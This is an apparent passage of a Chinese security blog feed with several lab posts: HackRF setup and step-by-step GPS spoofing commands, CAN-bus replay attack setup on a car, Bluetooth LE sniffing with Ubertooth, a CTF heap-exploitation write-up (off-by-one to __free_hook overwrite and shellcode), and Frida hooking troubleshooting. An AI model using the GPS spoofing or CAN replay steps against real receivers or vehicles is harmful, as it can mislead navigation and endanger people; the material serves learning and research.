href="https://mabin004.github.io/2018/02/08/frida%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8/" target="_blank" rel="noopener">https://mabin004.github.io/2018/02/08/frida%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8/</a> frida导出函数任意调用</p><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a> Android逆向之旅—Hook神器家族的Frida工具使用详解</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-9-10-hackrf使用及gps欺骗</title>
      <link href="/passages/2019-9-10-hackrf%E4%BD%BF%E7%94%A8%E5%8F%8Agps%E6%AC%BA%E9%AA%97/"/>
      <url>/passages/2019-9-10-hackrf%E4%BD%BF%E7%94%A8%E5%8F%8Agps%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1 id="hackrf使用"><a href="#hackrf使用" class="headerlink" title="hackrf使用"></a>hackrf使用</h1><p>环境：ubuntu16.04.3</p><p>环境搭建：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio</span><br><span class="line"></span><br><span class="line">sudo apt-get install hackrf</span><br><span class="line"></span><br><span class="line">sudo apt-get install gqrx-sdr</span><br><span class="line"></span><br><span class="line">sudo apt-get install libhackrf-dev</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> git://git.osmocom.org/gr-osmosdr</span><br><span class="line"><span class="comment">#GNU内就是用osmosdr作为信号发送端和接收端</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> gr-osmosdr/</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> build/</span><br><span class="line"></span><br><span class="line">cmake …/</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="gps欺骗"><a href="#gps欺骗" class="headerlink" title="gps欺骗"></a>gps欺骗</h2><p>在hackrf上安装好gpsdo晶振后就能稳定地进行gps欺骗了，之前没装gpsdo的usrp总是欺骗失败，虽然很多师傅都说usrpb210可以直接欺骗，但始终不成功，可能是虚拟机的原因吧。</p><p>安装好hackrf及gnuradio的环境后，就能安装<a href="https://github.com/osqzss/gps-sdr-sim" target="_blank" rel="noopener">gps-sdr-sim</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/osqzss/gps-sdr-sim.git</span><br><span class="line">cd gps-sdr-sim</span><br><span class="line">gcc gpssim.c -lm -O3 -o gps-sdr-sim</span><br></pre></td></tr></table></figure><p>gps模拟器默认运行时间只有五分钟（DUSER_MOTION_SIZE=3000），如果想要延长可以在gcc编译的时候就改设置，之后改设置也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc gpssim.c -lm -O3 -o gps-sdr-sim -DUSER_MOTION_SIZE=4000#gcc编译时就改设置</span><br><span class="line">make USER_MOTION_SIZE=4000#gcc编译后也可以改时间设置</span><br></pre></td></tr></table></figure><p>安装好gps-sdr-sim后就是下载星历</p><p><a href="ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily" target="_blank" rel="noopener">ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily</a></p><p>nasa的网站上就可以下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./gps-sdr-sim -e &lt;导航电文文件&gt; -g &lt;轨迹文件&gt; -b 8 #动态路线可以使用这个命令，轨迹文件格式为name</span><br><span class="line"></span><br><span class="line">sudo ./gps-sdr-sim -e brdc3540.14n -l 66.6855097600,60.0366210938,100 -s 2500000 -b 8#静态的可以用-l设置经纬度和高度，-e是星历文件，-s是频率，-b是采样精度，hackrf一般设为8，之后会在当前目录下生成gpssim.bin文件</span><br></pre></td></tr></table></figure><p>最后可以简单地使用命令实施gps欺骗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2500000 -a 1 -x 1 #-x是增益，如果不想不违法就不要太高，一般低于47都没问题</span><br></pre></td></tr></table></figure><h2 id="动态gps欺骗"><a href="#动态gps欺骗" class="headerlink" title="动态gps欺骗"></a>动态gps欺骗</h2><p>下载google erath 桌面版，然后点击添加路径，之后把小窗口移到旁边，就可以在地图上画路径了，点击确认后在位置栏对新增加的路劲右键保存为kml文件。</p><p>下载SatGenNMEA，载入kml文件，可以设置加速度和最高速度，生成nmea文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./gps-sdr-sim -e ./brdc3540.14n -g car.nmea -b 8</span><br></pre></td></tr></table></figure><p>生成gpssim.bin文件，之后步骤与静态gps欺骗一样</p><p>稍等一会后打开地图就会发现自己在跑了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-8-31-CAN总线学习与实车重放攻击</title>
      <link href="/passages/2019-8-31-CAN%E6%80%BB%E7%BA%BF%E5%AD%A6%E4%B9%A0/"/>
      <url>/passages/2019-8-31-CAN%E6%80%BB%E7%BA%BF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="CAN总线学习与实车重放攻击"><a href="#CAN总线学习与实车重放攻击" class="headerlink" title="CAN总线学习与实车重放攻击"></a>CAN总线学习与实车重放攻击</h1><h2 id="CAN总线知识学习："><a href="#CAN总线知识学习：" class="headerlink" title="CAN总线知识学习："></a>CAN总线知识学习：</h2><p>CAN 是Controller Area Network 的缩写（以下称为CAN），是ISO*1 国际标准化的串行通信协议。</p><p>在当前的汽车产业中，出于对安全性、舒适性、方便性、低公害、低成本的要求，各种各样的电子控制系统被开发了出来。由于这些系统之间通信所用的数据类型及对可靠性的要求不尽相同，由多条总线构成的情况很多，线束的数量也随之增加。为适应“减少线束的数量”、“通过多个LAN，进行大量数据的高速通信”的需要，1986 年德国电气商博世公司开发出面向汽车的CAN 通信协议。</p><p>以下是CAN总线设想图</p><p><img src="/images/can%E6%80%BB%E7%BA%BF/1.png" alt="img"></p><p>（以上摘自《CAN入门书》）</p><p>简单来说，CAN总线是在车辆上电子器件越来越多，大量点对点的电路控制线路占据车辆大量空间的情况下出现的。所有电子器件连接在几条CAN线上，绝大多数电子器件的控制和状态反馈都通过向CAN总线上传输CAN报文实现，相当于在汽车内部实现了一个局域网，每个报文基本结构就是：ID+DLE（数据长度）+data。</p><p><img src="/images/can%E6%80%BB%E7%BA%BF/2.png" alt="img"></p><p>基于这种情况，我们设想通过伪造CAN报文，控制ECU，比如开车门，调节空调温度等等。</p><p>目标车辆CAN总线资料阅读：</p><h2 id="CANOE软件使用："><a href="#CANOE软件使用：" class="headerlink" title="CANOE软件使用："></a>CANOE软件使用：</h2><p><img src="/images/can%E6%80%BB%E7%BA%BF/3.png" alt="img"></p><p>这是初始界面，接收到的报文会显示在Trace中，write是软件的日志。</p><p><img src="/images/can%E6%80%BB%E7%BA%BF/4.png" alt="img"></p><p>在sumulation中打开会有一个Network CAN 1，在CAN 1   延伸出来的线上右键可以添加replaybloc可以用于重放报文。</p><p><img src="/images/can%E6%80%BB%E7%BA%BF/5.png" alt="img"></p><p>Source file中可以选择需要重放的报文文件。</p><p>还有一个IG组件可以用于发送构造的报文。</p><p><img src="/images/can%E6%80%BB%E7%BA%BF/6.png" alt="img"></p><p>可以编辑ID、长度和data。</p><h2 id="实车测试："><a href="#实车测试：" class="headerlink" title="实车测试："></a>实车测试：</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-8-31-蓝牙抓包-Ubertooth及hollong</title>
      <link href="/passages/2019-8-31-%E8%93%9D%E7%89%99%E6%8A%93%E5%8C%85-Ubertooth%E5%8F%8Ahollong/"/>
      <url>/passages/2019-8-31-%E8%93%9D%E7%89%99%E6%8A%93%E5%8C%85-Ubertooth%E5%8F%8Ahollong/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝牙抓包-Ubertooth"><a href="#蓝牙抓包-Ubertooth" class="headerlink" title="蓝牙抓包-Ubertooth"></a>蓝牙抓包-Ubertooth</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>环境lib库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-software-properties</span><br><span class="line">add-apt-repository ppa:pyside</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install libnl-dev libusb-1.0-0-dev pyside-tools</span><br></pre></td></tr></table></figure><p>环境libbtbb：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/libbtbb/archive/2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gz</span><br><span class="line">tar xf libbtbb-2015-09-R2.tar.gz</span><br><span class="line">cd libbtbb-2015-09-R2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>ubertooth：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/ubertooth/releases/download/2015-09-R2/ubertooth-2015-09-R2.tar.xz -O ubertooth-2015-09-R2.tar.xz</span><br><span class="line">tar xf ubertooth-2015-09-R2.tar.xz</span><br><span class="line">cd ubertooth-2015-09-R2/host</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>低功耗蓝牙抓包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ubertooth-btle -f -c blue.pcap</span><br></pre></td></tr></table></figure><p>抓到的blue.pcap放入wireshark，数据格式无法识别</p><p>在wireshark的Edit-&gt;Preferences-&gt;protocols-&gt;DLT_USER中设置payload protocol为btle</p><p><img src="/images/2019-8-31-%E8%93%9D%E7%89%99%E6%8A%93%E5%8C%85/ubertooth.png" alt="ubertooth"></p><p>就能正常解析低功耗蓝牙包了</p><p>另外ubertooth可以指定双方蓝牙mac地址，从而跟踪指定的建链，如果只有-f -c参数则只能自动跟踪第一次抓到的建链信息，另外在实际的蓝牙抓包中发现，ble在第一次建链过程中是不加密的，但断开重连后第二次就会发送密钥，学习蓝牙协议栈后发现这是一个椭圆曲线加密，蓝牙建链双方会发送自己的公钥，因为不清楚双方的私钥，所以断开重连后的信息就无法破解了。</p><h2 id="hollong"><a href="#hollong" class="headerlink" title="hollong"></a>hollong</h2><p>hollong比起ubertooth更加简单，按官网上的说法在windows上先安装了驱动，然后安装软件，结果还是出现了驱动证书问题，无法正确识别驱动，只好在kali上使用，很顺利，linux下就不需要安装驱动了，直接运行官网上linux版本文件中的start.sh就行，只要确保三个蓝牙嗅探设备都接入就能点击start，这时候会出现设备列表，可以全抓也可以指定抓，比起ubertooth有了可视化界面，比较方便。</p><h2 id="蓝牙协议栈学习"><a href="#蓝牙协议栈学习" class="headerlink" title="蓝牙协议栈学习"></a>蓝牙协议栈学习</h2><p>推荐ble协议栈从零开始 <a href="https://blog.csdn.net/XG_2013/article/details/80726807" target="_blank" rel="noopener">https://blog.csdn.net/XG_2013/article/details/80726807</a></p><p>在抓包的时候发现有些设备的蓝牙mac地址不停变化，就是看了《ble协议栈从零开始四》解惑的。</p><p>在抓包过程中发现蓝牙断开重连后无法继续跟踪报文，看了《ble协议栈从零开始八》才明白，在实际中发现蓝牙断开重连后才会发送ENC报文，其中包含了密钥，因为没有双方设备的私钥，即使抓到公钥也没用，之所以之前能抓到包并得到数据完全是因为第一次建链没有加密。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-8-15-pwn静态编译题</title>
      <link href="/passages/2019-8-15-pwn%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E9%A2%98/"/>
      <url>/passages/2019-8-15-pwn%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-8-15"><a href="#2019-8-15" class="headerlink" title="2019-8-15"></a>2019-8-15</h1><h2 id="静态编译的解决-制作符号表并在ida中导入符号表"><a href="#静态编译的解决-制作符号表并在ida中导入符号表" class="headerlink" title="静态编译的解决-制作符号表并在ida中导入符号表"></a>静态编译的解决-制作符号表并在ida中导入符号表</h2><p>8月15号看同事打一个比赛，发现是一道没做过的静态编译题，就顺便做来学习一下</p><p>第一个难点：静态编译，无符号表，难以理解程序<br>解决方法：<br>将sig文件放到ida目录中的/sig/PC,然后在IDA中按ALT+(数字键)3能够添加符号表文件<br>符号表可以在github上下到，比如<a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">https://github.com/push0ebp/sig-database</a><br>但经过我实际体验，没太大作用，大部分函数还是找不到对应的符号，所以最好还是用工具自己做，ida一般在目录下会自带名字叫flair70.zip的包，如果没有可以自己下一个，在<a href="https://www.jianshu.com/p/7a1441e4f355（IDA" target="_blank" rel="noopener">https://www.jianshu.com/p/7a1441e4f355（IDA</a> 制作 sig文件 &amp;&amp; gdb 导入符号表）就有下载链接，符号表的制作也能参考这篇文章。</p><p><img src="/images/2019-8-15pwn/ida%E6%B7%BB%E5%8A%A0sig.png" alt="ida添加sig"></p><p>在途中func就表示匹配到了多少个函数，这样一来原本都是subxxxx显示的函数大部分被还原了，尤其是做堆题最重要的free和malloc</p><h2 id="寻找漏洞点-off-by-one"><a href="#寻找漏洞点-off-by-one" class="headerlink" title="寻找漏洞点-off by one"></a>寻找漏洞点-off by one</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  sub_8048AD1();</span><br><span class="line">  _IO_puts(<span class="string">"You know all, Please input:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = read();<span class="comment">//输入数字，选择功能</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80489E6();<span class="comment">//delete删除</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_8048A53();<span class="comment">//edit修改</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">exit</span>(v4, v5, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_804890B(v5, v4);<span class="comment">//add添加</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序就三个功能，添加、修改、删除，漏洞点在修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A53</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = read();<span class="comment">//输入数字，选择修改第几项</span></span><br><span class="line">  <span class="keyword">if</span> ( !sub_80489B1(v4) )</span><br><span class="line">    <span class="built_in">exit</span>(v0, v1, <span class="number">0</span>);</span><br><span class="line">  sub_804887C((<span class="keyword">int</span>)(&amp;s)[v4 + <span class="number">16</span>], (<span class="keyword">int</span>)(&amp;s)[v4]);<span class="comment">//（&amp;s）[v4]存储的是长度，(&amp;s)[v4 + 16]是chunk的地址，这个函数是一个一个字节往(&amp;s)[v4 + 16]指向的位置写入内容</span></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">strlen</span>((&amp;s)[v4 + <span class="number">16</span>]);<span class="comment">//漏洞点，产生了off by one</span></span><br><span class="line">  result = v4;</span><br><span class="line">  (&amp;s)[v4] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中在修改表项的时候有一个off by one的漏洞，这是因为在修改内容的时候，如果chunk中context的内容是满的，就会与下一个chunk的size相连，这时候调用strlen，会把size那一位也算进去，导致最后长度加一，这样子再次调用sub_8048A53函数的时候就可以修改size的一个字节了。</p><h2 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h2><p>能修改size位后，就能利用overlap，也就是让一个chunk的大小刚好覆盖自己本身和下一个chunk，这样再次调用sub_8048A53，就能直接修改下一个chunk的fd</p><p>fastbin有一个特性，在malloc的时候将fastbin中的chunk取出来，操作系统会检查它的fd，如果合法，就会把fd添加到fastbin的链表中，这样下次再malloc时，就能把fd指向的位置作为chunk。</p><p>我们在构造假fd时就需要一个有着合法size的地址，这时候&amp;s第一位就是最合适的选择了，因为我们能控制它的大小（第一个表项的大小），而且它所在的4个字节除了size位都是空的，能作为一个合法的假chunk。</p><p>但是我随后发现这样很不方便，因为我们接下来的目的是要把假chunk设到表项中，从而调用sub_8048A53修改表项</p><h2 id="修改freehook"><a href="#修改freehook" class="headerlink" title="修改freehook"></a>修改freehook</h2><p><img src="/images/2019-8-15pwn/%E8%A1%A8%E9%A1%B9.png" alt="表项"></p><p>&amp;s就是0x80eba00，可以看到前64个字节存储的是16个长度（那些0x61是通过上一步的overlap设置好假chunk后调用sub_8048A53修改的），红色框里是我修改的，它是freehook的地址</p><p>在libc中的free()函数会先检查__free_hook参数，如果__free_hook参数为0,则执行free，如果__free_hook不为0，则return __free_hook</p><p><img src="/images/2019-8-15pwn/freehook.png" alt="freehook"></p><p>在这道题中，freehook就是固定在0x80eb4f0，所以我们修改这里的值，就能控制程序流了</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>最后我们写入shellcode，把freehook的值改成shellcode所在位置然后调用free就能获得shell了。</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h2><p>除了修改freehook的方法，还能修改IO_FILE，具体还在学习,下次专门做一道IO_FILE的题目再具体学习吧。在pwndbg中可以查看IO_FILE结构题:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p *(_IO_FILE *)stdin</span><br><span class="line">p *(struct _IO_FILE_plus *) stdin</span><br><span class="line">p *((struct _IO_FILE_plus *) stdin).vtable</span><br></pre></td></tr></table></figure><h2 id="远程gdb调试技巧"><a href="#远程gdb调试技巧" class="headerlink" title="远程gdb调试技巧"></a>远程gdb调试技巧</h2><p>另外为了利用我闲置已久的阿里云服务器，学了下纯命令行下gdb远程调试技巧</p><p>写python脚本的时候使用pwntool的context模块<br>attach的时候会在tmux中打开新窗口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;)</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-8-8-通过frida学习hook</title>
      <link href="/passages/2019-8-8-%E9%80%9A%E8%BF%87frida%E5%AD%A6%E4%B9%A0hook/"/>
      <url>/passages/2019-8-8-%E9%80%9A%E8%BF%87frida%E5%AD%A6%E4%B9%A0hook/</url>
      
        <content type="html"><![CDATA[<h1 id="hook学习-frida"><a href="#hook学习-frida" class="headerlink" title="hook学习-frida"></a>hook学习-frida</h1><h2 id="编写APK"><a href="#编写APK" class="headerlink" title="编写APK"></a>编写APK</h2><p>在android studio上编写好程序后，可以用ADB把APK传到在手机上然后调试，首先需要在手机的开发者选项中开启usb调试模式才能连接ADB。<br>也可以用android studio写好程序后，在菜单栏-build选择build APK，然后在APP\fridatest\app\build\outputs\apk\debug文件下找到APK，放到手机上安装。</p><h2 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a>安装frida</h2><p>最简单、最顺利的方法是pip install frida和pip install frida-tools</p><p>如果运行失败，麻烦点的就是在 <a href="https://pypi.org/project/frida/#files" target="_blank" rel="noopener">https://pypi.org/project/frida/#files</a> 下载frida-12.6.16-py2.7-linux-x86_64.egg放到home目录，然后下载frida-12.6.16.tar.gz解压，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>frida-tools就直接pip install frida-tools</p><p>之后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps --version</span><br></pre></td></tr></table></figure><p>查看版本，能看到版本就说明安装成功了</p><p>如果安装失败可以直接pip uninstall frida卸载，重安</p><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>在kali上安装好frida和frida-tools后，在<a href="https://github.com/frida/frida/releases下载对应机型架构的frida-server，然后adb" target="_blank" rel="noopener">https://github.com/frida/frida/releases下载对应机型架构的frida-server，然后adb</a> push到手机/data/local/tmp（这里要注意的是frida版本和frida-server版本要对应）<br>我尝试了两部手机<br>第一部是nexus 5X ，安卓8.0.0系统，arm64，尝试运行load.py时遇到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;load.py&quot;, line 8, in &lt;module&gt;</span><br><span class="line">    pid = device.spawn([&quot;com.example.fridatest.fridatest&quot;])</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/frida/core.py&quot;, line 98, in spawn</span><br><span class="line">    return self._impl.spawn(program, argv, envp, env, cwd, stdio, aux_options)</span><br><span class="line">frida.ProcessNotFoundError: unable to find process with name &apos;system_server&apos;</span><br></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.example.fridatest.fridatest --no-pause</span><br></pre></td></tr></table></figure><p>后出现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     ____</span><br><span class="line">    / _  |   Frida 12.2.29 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &apos;object&apos;</span><br><span class="line">   . . . .       exit/quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at http://www.frida.re/docs/home/</span><br><span class="line">Failed to spawn: unable to find process with name &apos;system_server&apos;</span><br></pre></td></tr></table></figure><p>网上没有找到相似问题，我只好更换另一部手机，Nexus 6,安卓8.1.0系统<br>运行load.py又出现了问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;load.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    session = device.attach(pid)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/frida/core.py&quot;, line 110, in attach</span><br><span class="line">    return Session(self._impl.attach(self._pid_of(target)))</span><br><span class="line">frida.ProcessNotFoundError: unable to find process with pid 6286</span><br></pre></td></tr></table></figure><p>依旧未能解决</p><p>最后在 <a href="https://blog.csdn.net/cjx529377/article/details/95802532" target="_blank" rel="noopener">https://blog.csdn.net/cjx529377/article/details/95802532</a> 找到问题可能的原因，就是我的frida以前安装了12.2.16版本，而我下载的frida-server是12.6.16版本，两者版本不对应导致。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-7-22-zigbee环境搭建</title>
      <link href="/passages/2019-7-22-zigbee%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/passages/2019-7-22-zigbee%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
